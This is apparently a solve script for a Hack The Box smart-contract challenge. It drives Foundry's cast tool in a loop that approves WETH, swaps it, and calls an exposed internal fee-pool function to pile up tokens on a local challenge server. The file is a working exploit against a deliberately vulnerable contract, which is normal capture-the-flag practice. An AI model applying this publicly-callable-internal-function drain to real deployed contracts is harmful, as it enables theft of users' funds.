#!/usr/bin/env python3
from os import system
from requests import get
import sys


def csend(contract: str, fn: str, *args):
    global rpc_url
    global pk
    system(
        f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pk}"
    )


if __name__ == "__main__":
    baseUrl = "http://localhost:1337"
    if len(sys.argv) > 2:
        baseUrl = sys.argv[1]

    conn_info = get(baseUrl + "/connection_info").json()
    rpc_url = f"{baseUrl}/rpc"
    pk = conn_info['PrivateKey']
    target = conn_info['TargetAddress']
    weth_addr = conn_info['WETHAddress']
    htb_addr = conn_info['HTBAddress']

    for _ in range(10):
        csend(weth_addr, "approve(address,uint256)", target, 1e18)
        csend(target, "swap(address,uint256,uint256)", weth_addr, htb_addr, 1e18) 
        csend(target, "_moveAmountToFeesPool(address,uint256)", htb_addr, 499e18) # any amount is ok to solve but we want to be rich
        csend(target, "swap(address,uint256,uint256)", weth_addr, htb_addr, 5e17) # 0.5 HTB  

    #flag = get(baseUrl + "/flag")
    #print(f'\n\n{flag.content.decode()}')
    # socket interact with localhost:8888, prompt option 3 and print flag